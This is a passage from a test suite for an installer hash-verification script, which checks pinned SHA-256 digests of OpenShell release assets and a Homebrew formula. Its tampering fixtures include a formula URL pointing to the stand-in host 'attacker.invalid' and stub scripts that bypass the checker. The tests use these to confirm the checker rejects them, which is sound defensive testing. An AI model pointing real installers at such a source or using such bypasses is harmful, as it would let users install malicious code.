5fa81231f790de65b61421c96b3bd8ebdc8dff5cb1915bfbfdd20b9f26f8d3f4  openshell-gateway-0.0.101-1.fc44.aarch64.rpm
45b7e3d1909e25db7324a9569e9fc3f372e43045a2fd2bc8df6d780e00b21161  openshell-gateway-0.0.101-1.fc44.x86_64.rpm
a05a7379d6d7f329c3e3fd109af85a9b61184173dd41589e48e2dfff9c02a3d0  openshell-0.0.101-py3-none-macosx_13_0_arm64.whl
8c86d18a23ade9650d1c616ada7c3f2df28ed839e9fdc29368d2573064a63a7d  openshell-0.0.101-py3-none-manylinux_2_39_aarch64.whl
ae36a8001bceb7366f184b7b69d0d9d7f7b3a6b95d952d616ece4ff229fc0dcd  openshell-0.0.101-py3-none-manylinux_2_39_x86_64.whl
`,
  ],
  [
    "openshell-gateway-checksums-sha256.txt",
    `eaeb094ccf7dcb1fe00c7e926e6aa9aaaefb89ecbef8343720628b0fd2d84654  openshell-gateway-x86_64-unknown-linux-gnu.tar.gz
ac842ccc2ab8b5682f7479d71532cc650839250a8a41dbfae2b871cbbdfd3279  openshell-gateway-aarch64-unknown-linux-gnu.tar.gz
0f9e195b7cde57f4c2080df95159c5e7e72b0248306abc242ae00a3bb6f07f14  openshell-gateway-aarch64-apple-darwin.tar.gz
`,
  ],
  [
    "openshell-sandbox-checksums-sha256.txt",
    `953b90eaa7d2fc1bb7bdf38eb0ada6fad7902b13f9f895ca20b89caeac483a9e  openshell-sandbox-x86_64-unknown-linux-gnu.tar.gz
c39b7ba3cf212b88712a00d2a0e3d28e2c1e0e9f47a9a6ca818a8f06ed2140aa  openshell-sandbox-aarch64-unknown-linux-gnu.tar.gz
`,
  ],
]);
const V00101_ASSET_DIGESTS = new Map([
  ...[...V00101_CHECKSUM_MANIFESTS.values()].flatMap((contents) =>
    contents
      .trim()
      .split("\n")
      .map((line) => {
        const [digest, asset] = line.split(/\s+/);
        return [asset, digest] as const;
      }),
  ),
  ["openshell.rb", "87fadc7b0c854aa44f71d5b3a206865070117cd27825d59c61da252a99f402a2"],
]);
const CHECKSUM_MANIFESTS_BY_VERSION = new Map([
  ["0.0.99", V0099_CHECKSUM_MANIFESTS],
  ["0.0.101", V00101_CHECKSUM_MANIFESTS],
]);
const ASSET_DIGESTS_BY_VERSION = new Map([
  ["0.0.99", V0099_ASSET_DIGESTS],
  ["0.0.101", V00101_ASSET_DIGESTS],
]);
const CHECKER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
  "allowlisted-alternate-version": (source) => {
    const alternateEntries = [...CHECKSUM_MANIFESTS.entries()]
      .map(
        ([manifest, contents]) =>
          `  "9.9.9|${manifest}|${createHash("sha256").update(contents).digest("hex")}"`,
      )
      .join("\n");
    const manifests = source.replace(
      "readonly -a OPENSHELL_RELEASE_MANIFEST_ALLOWLIST=(\n",
      `readonly -a OPENSHELL_RELEASE_MANIFEST_ALLOWLIST=(\n${alternateEntries}\n`,
    );
    const formula = manifests.replace(
      "readonly -a OPENSHELL_RELEASE_FORMULA_ALLOWLIST=(\n",
      `readonly -a OPENSHELL_RELEASE_FORMULA_ALLOWLIST=(\n  "9.9.9|openshell.rb|https://github.com/NVIDIA/OpenShell/releases/download/v9.9.9/openshell.rb|${FORMULA_DIGEST}"\n`,
    );
    expect(manifests !== source && formula !== manifests, "alternate anchors").toBe(true);
    return formula;
  },
  "duplicate-trusted-formula": (source) =>
    source.replace(
      "readonly -a OPENSHELL_RELEASE_FORMULA_ALLOWLIST=(\n",
      `readonly -a OPENSHELL_RELEASE_FORMULA_ALLOWLIST=(\n  "0.0.72|openshell.rb|https://github.com/NVIDIA/OpenShell/releases/download/v0.0.72/openshell.rb|${FORMULA_DIGEST}"\n`,
    ),
  "incomplete-trusted-allowlist": (source) =>
    source.replace(
      /^\s*"0\.0\.72\|openshell-sandbox-checksums-sha256\.txt\|[a-f0-9]{64}"\s*$/m,
      "",
    ),
  "malformed-trusted-formula": (source) =>
    source.replace(`v0.0.72/openshell.rb|${FORMULA_DIGEST}`, "v0.0.72/openshell.rb|invalid"),
  "mismatched-trusted-formula-url": (source) =>
    source.replace(
      "https://github.com/NVIDIA/OpenShell/releases/download/v0.0.72/openshell.rb",
      "https://attacker.invalid/openshell.rb",
    ),
  "missing-trusted-formula": (source) =>
    source.replace(
      /^\s*"0\.0\.72\|openshell\.rb\|https:\/\/github\.com\/NVIDIA\/OpenShell\/releases\/download\/v0\.0\.72\/openshell\.rb\|[a-f0-9]{64}"\s*$/m,
      "",
    ),
  "trusted-formula-mismatch": (source) => source.replace(FORMULA_DIGEST, "0".repeat(64)),
};
const trustAlternateSandboxBuilds = (source: string): string => {
  const digests = SYNTHETIC_SANDBOX_BUILD_DIGESTS;
  return source.replace(
    "const TRUSTED_SANDBOX_BUILD_PINS: readonly TrustedSandboxBuildPin[] = [\n",
    `const TRUSTED_SANDBOX_BUILD_PINS: readonly TrustedSandboxBuildPin[] = [
  { required: false, sha256: "${digests[0]}", version: "9.9.9" },
  { required: false, sha256: "${digests[1]}", version: "9.9.9" },
`,
  );
};
const PARSER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
  "allowlisted-alternate-version": trustAlternateSandboxBuilds,
  "trusted-sandbox-alternate-version": trustAlternateSandboxBuilds,
};
const tempDirs: string[] = [];

afterEach(() => {
  for (const tempDir of tempDirs.splice(0)) {
    fs.rmSync(tempDir, { recursive: true, force: true });
  }
});

function renderPinFunction(
  functionName: string,
  assets: string[],
  openshellVersion: string,
  formatting: PinFormatting,
  assetDigests = ASSET_DIGESTS,
): string {
  const functionOpening =
    formatting === "mixed-whitespace" ? `${functionName}\t( )\t{` : `${functionName}() {`;
  const localInputs =
    formatting === "equals-whitespace"
      ? '  local release_tag = "$1" asset = "$2"'
      : formatting === "mixed-whitespace"
        ? '\tlocal\trelease_tag="$1"\tasset="$2"'
        : '  local release_tag="$1" asset="$2"';
  const caseOpening =
    formatting === "mixed-whitespace"
      ? '\tcase\t"${release_tag}:${asset}"\tin'
      : '  case "${release_tag}:${asset}" in';
  const cases = assets
    .map((asset) => {
      const digest = assetDigests.get(asset) ?? "missing";
      const pattern =
        formatting === "quote-styles"
          ? `    'v${openshellVersion}:${asset}')`
          : formatting === "mixed-whitespace"
            ? `\t  v${openshellVersion}:${asset}\t)`
            : `    v${openshellVersion}:${asset})`;
      const patternLine = formatting === "comments" ? `${pattern} # exact asset` : pattern;
      const printfLine =
        formatting === "line-continuations"
          ? `      printf \\
        '%s\\n' \\
        "${digest}"`
          : formatting === "quote-styles"
            ? `      printf "%s\\n" '${digest}'`
            : formatting === "mixed-whitespace"
              ? `\t\tprintf\t'%s\\n'\t"${digest}"`
              : `      printf '%s\\n' "${digest}"`;
      const commentedPrintf =
        formatting === "comments" ? `${printfLine} # published SHA-256` : printfLine;
      const terminator = formatting === "mixed-whitespace" ? "\t\t;;" : "      ;;";
      return `${patternLine}\n${commentedPrintf}\n${terminator}`;
    })
    .join("\n");
  return `${functionOpening}\n${localInputs}\n${caseOpening}\n${cases}\n    *)\n      return 1\n      ;;\n  esac\n}\n`;
}

function replacePinFunction(
  source: string,
  functionName: string,
  nextMarker: string,
  replacement: string,
): string {
  const start = source.indexOf(`${functionName}() {`);
  const next = source.indexOf(`\n${nextMarker}`, start);
  expect(start, `${functionName} template start`).not.toBe(-1);
  expect(next, `${functionName} template end`).not.toBe(-1);
  return `${source.slice(0, start)}${replacement}${source.slice(next)}`;
}

function renderInstallerTemplate(openshellVersion: string, pinFunction: string): string {
  const selected = INSTALLER_TEMPLATE.replace(
    /^MIN_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m,
    `MIN_VERSION="${openshellVersion}"`,
  )
    .replace(/^MAX_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m, `MAX_VERSION="${openshellVersion}"`)
    .replace(
      /^DEV_MIN_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m,
      `DEV_MIN_VERSION="${openshellVersion}"`,
    );
  const withPinFunction = replacePinFunction(
    selected,
    "openshell_pinned_sha256",
    "openshell_checksum_line() {",
    pinFunction,
  );
  const sandboxFunctionStart = withPinFunction.indexOf("pinned_sandbox_build_version() {");
  const sandboxFunctionEnd = withPinFunction.indexOf(
    "\ncomponent_build_version() {",
    sandboxFunctionStart,
  );
  expect(sandboxFunctionStart, "sandbox build map template start").not.toBe(-1);
  expect(sandboxFunctionEnd, "sandbox build map template end").not.toBe(-1);
  const sandboxFunction = withPinFunction.slice(sandboxFunctionStart, sandboxFunctionEnd);
  const hasSandboxBuild = sandboxFunction.includes(`printf '%s\\n' "${openshellVersion}"`);
  const selectedDigests =
    openshellVersion === "0.0.101"
      ? V00101_SANDBOX_BUILD_DIGESTS
      : openshellVersion === "9.9.9"
        ? SYNTHETIC_SANDBOX_BUILD_DIGESTS
        : undefined;
  expect(hasSandboxBuild || selectedDigests, `sandbox fixture ${openshellVersion}`).toBeTruthy();
  return hasSandboxBuild
    ? withPinFunction
    : addSandboxBuildPins(withPinFunction, openshellVersion, selectedDigests!);
}

function renderBrevTemplate(openshellVersion: string, pinFunction: string): string {
  const selected = BREV_TEMPLATE.replace(
    /^(\s*stable\s*\|\s*auto\)\s*OPENSHELL_VERSION=")v[0-9]+\.[0-9]+\.[0-9]+("\s*;;\s*)$/m,
    `$1v${openshellVersion}$2`,
  );
  return replacePinFunction(
    selected,
    "openshell_cli_pinned_sha256",
    "openshell_checksum_line() {",
    pinFunction,
  );
}

function createFixture(
  openshellVersion = "0.0.72",
  formatting: PinFormatting = "canonical",
): string {
  const checksumManifests =
    CHECKSUM_MANIFESTS_BY_VERSION.get(openshellVersion) ?? CHECKSUM_MANIFESTS;
  const assetDigests = ASSET_DIGESTS_BY_VERSION.get(openshellVersion) ?? ASSET_DIGESTS;
  const fixtureRoot = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-installer-hash-"));
  const scriptsDir = path.join(fixtureRoot, "scripts");
  const checksDir = path.join(scriptsDir, "checks");
  const binDir = path.join(fixtureRoot, "bin");
  tempDirs.push(fixtureRoot);
  fs.mkdirSync(checksDir, { recursive: true });
  fs.mkdirSync(binDir, { recursive: true });
  fs.mkdirSync(path.join(fixtureRoot, "nemoclaw-blueprint"), {
    recursive: true,
  });
  const checker = fs.readFileSync(
    path.join(REPO_ROOT, "scripts", "check-installer-hash.sh"),
    "utf8",
  );
  fs.writeFileSync(path.join(scriptsDir, "check-installer-hash.sh"), checker);
  fs.copyFileSync(
    path.join(REPO_ROOT, "scripts", "checks", "extract-installer-pins.mts"),
    path.join(checksDir, "extract-installer-pins.mts"),
  );

  fs.writeFileSync(
    path.join(fixtureRoot, "nemoclaw-blueprint", "blueprint.yaml"),
    `max_openshell_version: "${openshellVersion}"\n`,
  );
  fs.writeFileSync(
    path.join(scriptsDir, "install-openshell.sh"),
    renderInstallerTemplate(
      openshellVersion,
      renderPinFunction(
        "openshell_pinned_sha256",
        INSTALLER_ASSETS,
        openshellVersion,
        formatting,
        assetDigests,
      ),
    ),
  );
  fs.writeFileSync(
    path.join(scriptsDir, "brev-launchable-ci-cpu.sh"),
    renderBrevTemplate(
      openshellVersion,
      renderPinFunction(
        "openshell_cli_pinned_sha256",
        ASSETS.slice(0, 2),
        openshellVersion,
        formatting,
        assetDigests,
      ),
    ),
  );
  fs.writeFileSync(
    path.join(binDir, "curl"),
    `#!/usr/bin/env bash
set -euo pipefail
output=
url=
while [ "$#" -gt 0 ]; do
  case "$1" in
    -o) output="$2"; shift 2 ;;
    http*) url="$1"; shift ;;
    *) shift ;;
  esac
done
case "$url" in
  *releases/download/v${openshellVersion}/*)
    case "\${NEMOCLAW_TEST_CURL_MODE}" in
      failure) exit 22 ;;
    esac
    case "\${url##*/}" in
      openshell-checksums-sha256.txt)
        case "\${NEMOCLAW_TEST_CURL_MODE}" in
          partial) printf '%s\\n' '${checksumManifests.get("openshell-checksums-sha256.txt")?.split("\n")[0]}' >"$output" ;;
          *) printf '%s' '${checksumManifests.get("openshell-checksums-sha256.txt")}' >"$output" ;;
        esac
        ;;
      openshell-gateway-checksums-sha256.txt)
        case "\${NEMOCLAW_TEST_CURL_MODE}" in
          partial-manifest-missing)
            printf '%s\n' 'curl: (22) The requested URL returned error: 404' >&2
            exit 22
            ;;
          *) printf '%s' '${checksumManifests.get("openshell-gateway-checksums-sha256.txt")}' >"$output" ;;
        esac
        ;;
      openshell-sandbox-checksums-sha256.txt)
        printf '%s' '${checksumManifests.get("openshell-sandbox-checksums-sha256.txt")}' >"$output"
        ;;
      openshell.rb)
        printf '%s\n' 'class Openshell < Formula; end' >"$output"
        ;;
    esac
    ;;
esac
`,
  );
  fs.chmodSync(path.join(binDir, "curl"), 0o755);
  fs.writeFileSync(
    path.join(binDir, "sha256sum"),
    `#!/usr/bin/env bash
set -euo pipefail
case "\${1:-}" in
  */openshell.rb)
    case "\${NEMOCLAW_TEST_CURL_MODE:-}" in
      formula-mismatch | formula-self-authorized) digest='${"0".repeat(64)}' ;;
      *) digest='${assetDigests.get(FORMULA_ASSET)}' ;;
    esac
    printf '%s  %s\\n' "$digest" "$1"
    ;;
  *)
    case "$(uname -s)" in
      Darwin) /usr/bin/shasum -a 256 "$@" ;;
      *) /usr/bin/sha256sum "$@" ;;
    esac
    ;;
esac
`,
  );
  fs.chmodSync(path.join(binDir, "sha256sum"), 0o755);
  return fixtureRoot;
}

function runFixture(
  mode: FixtureMode,
  openshellVersion?: string,
  trustedChecker = false,
  formatting: PinFormatting = "canonical",
) {
  const fixtureRoot = createFixture(openshellVersion, formatting);
  const targetChecker = path.join(fixtureRoot, "scripts", "check-installer-hash.sh");
  const trustedRoot = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-trusted-hash-check-"));
  const trustedCheckerPath = path.join(trustedRoot, "scripts", "check-installer-hash.sh");
  const trustedParserPath = path.join(
    trustedRoot,
    "scripts",
    "checks",
    "extract-installer-pins.mts",
  );
  tempDirs.push(trustedRoot);
  fs.mkdirSync(path.dirname(trustedParserPath), { recursive: true });
  fs.copyFileSync(path.join(REPO_ROOT, "scripts", "check-installer-hash.sh"), trustedCheckerPath);
  fs.copyFileSync(
    path.join(REPO_ROOT, "scripts", "checks", "extract-installer-pins.mts"),
    trustedParserPath,
  );
  const parserSource = fs.readFileSync(trustedParserPath, "utf8");
  const mutateParser = PARSER_MUTATIONS[mode];
  const parserResult = mutateParser?.(parserSource) ?? parserSource;
  expect(parserResult === parserSource, `parser mutation ${mode}`).toBe(mutateParser === undefined);
  fs.writeFileSync(trustedParserPath, parserResult);
  fs.writeFileSync(
    targetChecker,
    trustedChecker
      ? "#!/usr/bin/env bash\necho PR_CHECKER_EXECUTED\nexit 0\n"
      : fs.readFileSync(targetChecker, "utf8"),
  );
  const checker = trustedChecker ? trustedCheckerPath : targetChecker;
  const checkerSource = fs.readFileSync(checker, "utf8");
  const mutateChecker = CHECKER_MUTATIONS[mode];
  const checkerResult = mutateChecker?.(checkerSource) ?? checkerSource;
  expect(checkerResult === checkerSource, `checker ${mode}`).toBe(mutateChecker === undefined);
  fs.writeFileSync(checker, checkerResult);
  const installer = path.join(fixtureRoot, "scripts", "install-openshell.sh");
  const blueprint = path.join(fixtureRoot, "nemoclaw-blueprint", "blueprint.yaml");
  const installerSource = fs.readFileSync(installer, "utf8");
  const mutateInstaller = INSTALLER_MUTATIONS[mode] ?? ((source: string) => source);
  fs.writeFileSync(installer, mutateInstaller(installerSource));
  const brevInstaller = path.join(fixtureRoot, "scripts", "brev-launchable-ci-cpu.sh");
  const brevSource = fs.readFileSync(brevInstaller, "utf8");
  const mutateBrev = BREV_MUTATIONS[mode] ?? ((source: string) => source);
  fs.writeFileSync(brevInstaller, mutateBrev(brevSource));
  const targetParser = path.join(fixtureRoot, "scripts", "checks", "extract-installer-pins.mts");
  fs.writeFileSync(
    targetParser,
    mode === "pr-parser-bypass"
      ? 'process.stdout.write("PR_PARSER_EXECUTED\\n");\n'
      : fs.readFileSync(targetParser, "utf8"),
  );
  INPUT_MUTATIONS[mode]?.({ blueprint, brevInstaller, fixtureRoot, installer });
  return spawnSync("bash", [checker], {
    cwd: fixtureRoot,
    encoding: "utf8",
    env: {
      ...process.env,
      GITHUB_TOKEN: "",
      GH_TOKEN: "",
      NEMOCLAW_INSTALLER_HASH_REPO_ROOT: trustedChecker ? fixtureRoot : "",
      NEMOCLAW_TEST_CURL_MODE:
        mode.includes("bypass") || mode === "brev-mismatch" ? "complete" : mode,
      PATH: `${path.join(fixtureRoot, "bin")}:${process.env.PATH ?? ""}`,
    },
  });
}

describe("installer hash verification", () => {
  it("verifies all installer and Brev pins from token-free checksum manifests", () => {
    const result = runFixture("complete");

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("verifies the pinned Homebrew formula", () => {
    const result = runFixture("complete", undefined, true);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain(`OK: installer ${FORMULA_ASSET} (${FORMULA_DIGEST})`);
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("rejects drift from the reviewed Homebrew trust transition", () => {
    const result = runFixture("installer-homebrew-trust-transition-drift", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("installer operational template is not base-trusted");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("rejects the prior template that leaves stable formula trust behind", () => {
    const result = runFixture("installer-homebrew-trust-transition-stable-leak", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("installer operational template is not base-trusted");
    expect(result.stdout).toContain(
      "actual_sha256=ee10afaeb5dc1477ca4b35a70a654ed32092399dbb290266f9f138d64484f1e2",
    );
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("rejects the legacy installer template after completing the trust transition (#7451)", () => {
    const legacy = runFixture(
      "installer-homebrew-trust-transition-complete-current",
      undefined,
      true,
    );

    expect(legacy.status).toBe(1);
    expect(legacy.stdout).toContain("installer operational template is not base-trusted");
  });

  it("rejects cleanup that deletes the formula after untrust fails", () => {
    const result = runFixture("installer-homebrew-untrust-cleanup-drift", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("installer operational template is not base-trusted");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when the Homebrew formula digest does not match", () => {
    const result = runFixture("formula-mismatch", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: installer openshell.rb does not match the base-trusted v0.0.72 formula digest",
    );
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when the installer formula pin differs from the base-trusted digest", () => {
    const result = runFixture("formula-pin-mismatch", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: installer openshell.rb pin does not match the base-trusted v0.0.72 formula digest",
    );
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("prevents a pin change from self-authorizing a replaced formula asset", () => {
    const result = runFixture("formula-self-authorized", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: installer openshell.rb does not match the base-trusted v0.0.72 formula digest",
    );
    expect(result.stdout).toContain(`trusted:  ${FORMULA_DIGEST}`);
    expect(result.stdout).toContain(`upstream: ${"0".repeat(64)}`);
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("derives the release version from matching static installer pin tables", () => {
    const result = runFixture("complete", undefined, true);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("accepts the allowlisted OpenShell 0.0.99 release manifests (#8499)", () => {
    const result = runFixture("complete", "0.0.99", true);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("Checking OpenShell v0.0.99 release assets");
    expect(result.stdout).toContain(
      "OK: openshell-checksums-sha256.txt (ea3e2c1a583e5ea00332c3b65a18068bd1f9b090f7ff0f5e24b29762cfc3b4c7)",
    );
    expect(result.stdout).toContain(
      "OK: openshell-gateway-checksums-sha256.txt (7f84f728412548720c8ef51993c58414c4f04598451c282b26ead233185e40c5)",
    );
    expect(result.stdout).toContain(
      "OK: openshell-sandbox-checksums-sha256.txt (9e67af6bab9f975432a1045fcfea5ab182ab585b17886c8c290c1eb77232b87a)",
    );
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("accepts the reviewed OpenShell 0.0.101 release manifests (#8598)", () => {
    const result = runFixture("complete", "0.0.101", true);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("Checking OpenShell v0.0.101 release assets");
    expect(result.stdout).toContain(
      "OK: openshell-checksums-sha256.txt (9c90869d00b109b5ac1062b1a9808a592c2311d3c0c4926bae44d136b979d8a9)",
    );
    expect(result.stdout).toContain(
      "OK: openshell-gateway-checksums-sha256.txt (dcb3f1917713bf2a8e8e1803ac42c5e39d9dd41e644136b05def32b077082777)",
    );
    expect(result.stdout).toContain(
      "OK: openshell-sandbox-checksums-sha256.txt (d16f7d369c54d74d36c7df036565267a960e7ce6fb143012fe9d77f257d6e8b3)",
    );
    expect(result.stdout).toContain(
      "OK: installer openshell.rb (87fadc7b0c854aa44f71d5b3a206865070117cd27825d59c61da252a99f402a2)",
    );
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("selects a second complete trusted release from the allowlist", () => {
    const result = runFixture("allowlisted-alternate-version", "9.9.9", true);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("Checking OpenShell v9.9.9 release assets");
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("fails closed when the derived release is not allowlisted", () => {
    const result = runFixture("trusted-sandbox-alternate-version", "9.9.9", true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "OpenShell v9.9.9 is not in the trusted release-manifest allowlist",
    );
    expect(result.stdout).not.toContain("Checking OpenShell v9.9.9 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("requires the trusted allowlist prerequisite before a newer pin PR", () => {
    // The first invocation deliberately keeps both trusted identity sets in
    // their old base state while the separate target tree selects 9.9.9. The
    // target cannot authorize itself. The second invocation models both trust
    // prerequisites already present in base code; only then may the otherwise
    // identical pin tree pass.
    const beforePrerequisite = runFixture("complete", "9.9.9", true);
    expect(beforePrerequisite.status).toBe(1);
    expect(beforePrerequisite.stdout).toContain(
      "no base-trusted standalone sandbox binary identities exist for release 9.9.9",
    );
    expect(beforePrerequisite.stdout).not.toContain("PR_CHECKER_EXECUTED");

    const afterPrerequisite = runFixture("allowlisted-alternate-version", "9.9.9", true);
    expect(afterPrerequisite.status).toBe(0);
    expect(afterPrerequisite.stdout).toContain("Checking OpenShell v9.9.9 release assets");
    expect(afterPrerequisite.stdout).toContain("All installer hashes are current");
    expect(afterPrerequisite.stdout).not.toContain("PR_CHECKER_EXECUTED");
  });

  it("fails closed when an allowlisted release lacks all three manifest digests", () => {
    const result = runFixture("incomplete-trusted-allowlist", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "OpenShell v0.0.72 does not have exactly three trusted release-manifest digests",
    );
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    "missing-trusted-formula",
    "duplicate-trusted-formula",
  ] as const)("fails closed when an allowlisted release has an invalid formula trust cardinality: %s", (mode) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "OpenShell v0.0.72 does not have exactly one trusted openshell.rb digest",
    );
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    "malformed-trusted-formula",
    "mismatched-trusted-formula-url",
  ] as const)("fails closed when a trusted formula allowlist tuple is invalid: %s", (mode) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("trusted OpenShell formula allowlist is invalid");
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when the live formula differs from its trusted release digest", () => {
    const result = runFixture("trusted-formula-mismatch", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: installer openshell.rb does not match the base-trusted v0.0.72 formula digest",
    );
    expect(result.stdout).toContain(`trusted:  ${"0".repeat(64)}`);
    expect(result.stdout).toContain(`upstream: ${FORMULA_DIGEST}`);
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("rejects newer runtime consumers when both trusted pin tables stay on an older release", () => {
    const result = runFixture("runtime-consumers-newer-than-tables", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(
      "installer pin-table release 0.0.72 must match blueprint max_openshell_version 0.0.85",
    );
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    [
      "installer-min-version-drift",
      "installer pin-table release 0.0.72 must match installer MIN_VERSION 0.0.85",
    ],
    [
      "installer-max-version-drift",
      "installer pin-table release 0.0.72 must match installer MAX_VERSION 0.0.85",
    ],
    [
      "installer-dev-min-version-drift",
      "installer pin-table release 0.0.72 must match installer DEV_MIN_VERSION 0.0.85",
    ],
    [
      "brev-stable-version-drift",
      "installer pin-table release 0.0.72 must match Brev stable OpenShell default 0.0.85",
    ],
    ["installer-pin-selector-drift", "installer operational template is not base-trusted"],
  ] as const)("rejects %s", (mode, diagnostic) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(diagnostic);
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    ["installer-decoy-table", "installer operational template is not base-trusted"],
    ["installer-comment-decoy", "installer operational template is not base-trusted"],
    ["installer-dead-code-decoy", "installer operational template is not base-trusted"],
    [
      "installer-later-min-selector-override",
      "installer selector 1 must contain exactly one permitted release selector literal",
    ],
    ["installer-later-selector-override", "installer operational template is not base-trusted"],
    ["installer-indirect-selector-override", "installer operational template is not base-trusted"],
    ["installer-sha-command-bypass", "installer operational template is not base-trusted"],
    ["installer-extra-download", "installer operational template is not base-trusted"],
    ["installer-changed-asset", "installer operational template is not base-trusted"],
    ["installer-changed-checksum", "installer operational template is not base-trusted"],
    ["installer-changed-url", "installer operational template is not base-trusted"],
    ["installer-bypassed-comparison", "installer operational template is not base-trusted"],
    ["installer-changed-extraction-target", "installer operational template is not base-trusted"],
    ["brev-decoy-table", "Brev launchable operational template is not base-trusted"],
    ["brev-comment-decoy", "Brev launchable operational template is not base-trusted"],
    ["brev-dead-code-decoy", "Brev launchable operational template is not base-trusted"],
    ["brev-bypassed-verifier-call", "Brev launchable operational template is not base-trusted"],
    ["brev-later-selector-override", "Brev launchable operational template is not base-trusted"],
    ["brev-indirect-selector-override", "Brev launchable operational template is not base-trusted"],
    ["brev-sha-command-bypass", "Brev launchable operational template is not base-trusted"],
    ["brev-extra-download", "Brev launchable operational template is not base-trusted"],
    ["brev-changed-asset", "Brev launchable operational template is not base-trusted"],
    ["brev-changed-url", "Brev launchable operational template is not base-trusted"],
    ["brev-bypassed-comparison", "Brev launchable operational template is not base-trusted"],
    ["brev-changed-extraction-target", "Brev launchable operational template is not base-trusted"],
  ] as const)("rejects operational-consumption drift in %s", (mode, diagnostic) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(diagnostic);
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    [
      "installer-literalized-pin-input",
      "openshell_pinned_sha256 must start with local release_tag and asset inputs",
    ],
    [
      "brev-literalized-pin-selector",
      "openshell_cli_pinned_sha256 must select on release_tag and asset",
    ],
    [
      "multiple-installer-versions",
      "openshell_pinned_sha256 must contain exactly one release version, found 0.0.72, 0.0.73",
    ],
    [
      "mismatched-table-versions",
      "installer and Brev launchable pin tables must use the same release version, found 0.0.72, 0.0.73",
    ],
  ] as const)("fails closed for %s", (mode, diagnostic) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(diagnostic);
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    [
      "official-but-unexpected-installer-asset",
      "installer pin table must contain the exact consumed asset set",
      OFFICIAL_UNEXPECTED_INSTALLER_ASSET,
    ],
    [
      "official-but-unexpected-brev-asset",
      "Brev pin table must contain the exact consumed asset set",
      OFFICIAL_UNEXPECTED_BREV_ASSET,
    ],
  ] as const)("rejects %s despite a valid published digest", (mode, diagnostic, unexpected) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(diagnostic);
    expect(result.stdout).toContain(`unexpected=[${unexpected}]`);
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    "equals-whitespace",
    "comments",
    "line-continuations",
    "quote-styles",
    "mixed-whitespace",
  ] as const)("extracts pins across %s formatting", (formatting) => {
    const result = runFixture("complete", undefined, false, formatting);

    expect(result.status).toBe(0);
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it("lets trusted checker code inspect a separate pull-request tree", () => {
    const result = runFixture("complete", undefined, true);

    expect(result.status).toBe(0);
